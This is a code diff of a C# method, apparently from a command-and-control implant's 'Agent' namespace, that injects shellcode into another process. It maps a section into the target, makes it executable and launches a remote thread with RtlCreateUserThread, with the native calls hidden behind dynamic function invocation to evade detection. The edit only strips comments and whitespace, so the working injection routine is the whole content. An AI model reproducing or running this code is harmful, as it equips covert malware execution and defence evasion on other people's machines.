@@ -49,12 +49,6 @@ namespace Agent
                 return false;
             } 
 
-
-
-            
-
-
-
             IntPtr hSectionHandle = IntPtr.Zero;
             IntPtr pLocalView = IntPtr.Zero;
             UInt64 size = (UInt32)shellcode.Length;
@@ -62,7 +56,6 @@ namespace Agent
             // create a new section to map view to
             object[] ncsParams = new object[] { hSectionHandle, Native.SectionAccess.SECTION_ALL_ACCESS, IntPtr.Zero, size, Native.MemoryProtection.PAGE_EXECUTE_READWRITE, Native.MappingAttributes.SEC_COMMIT, IntPtr.Zero };
             UInt32 result = Generic.DynamicFunctionInvoke<UInt32>(ncsFunc, typeof(ncsDelegate), ref ncsParams);
-            //UInt32 result = Native.NtCreateSection(ref hSectionHandle, Native.SectionAccess.SECTION_ALL_ACCESS, IntPtr.Zero, ref size, Native.MemoryProtection.PAGE_EXECUTE_READWRITE, Native.MappingAttributes.SEC_COMMIT, IntPtr.Zero);
 
             if (result != 0)
             {
@@ -77,8 +70,6 @@ namespace Agent
             size = (ulong)ncsParams[3];
 
             object[] nmvosParams = new object[] { hSectionHandle, (IntPtr)(-1), pLocalView, UIntPtr.Zero, UIntPtr.Zero, offset, size, ViewUnmap, (UInt32)0, Native.MemoryProtection.PAGE_READWRITE };
-
-            //result = Native.NtMapViewOfSection(hSectionHandle, (IntPtr)(-1), ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, Native.MemoryProtection.PAGE_READWRITE);
             result = Generic.DynamicFunctionInvoke<UInt32>(mvsFunc, typeof(nmpvosDelegate), ref nmvosParams);
 
 
@@ -102,7 +93,6 @@ namespace Agent
 
             pRemoteView = (nint)nmvosParams2[2];
 
-            //Native.NtMapViewOfSection(hSectionHandle, htarget, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, Native.MemoryProtection.PAGE_EXECUTE_READ);
             // execute the shellcode
             IntPtr hThread = IntPtr.Zero;
             Native.CLIENT_ID cid = new Native.CLIENT_ID();
@@ -110,16 +100,8 @@ namespace Agent
             object[] rcutParams = new object[] { htarget, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, hThread, cid };
             var res = Generic.DynamicFunctionInvoke<nint>(rcutFunc, typeof(rcutDelegate), ref rcutParams);
 
-            //Native.RtlCreateUserThread(htarget, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, cid);
-
             hThread = (nint)rcutParams[8];
-
-            //if (hThread == IntPtr.Zero)
-            //{
-            //    return false;
-            //}
             
-
             //Need to unmap?
             return true;
         }
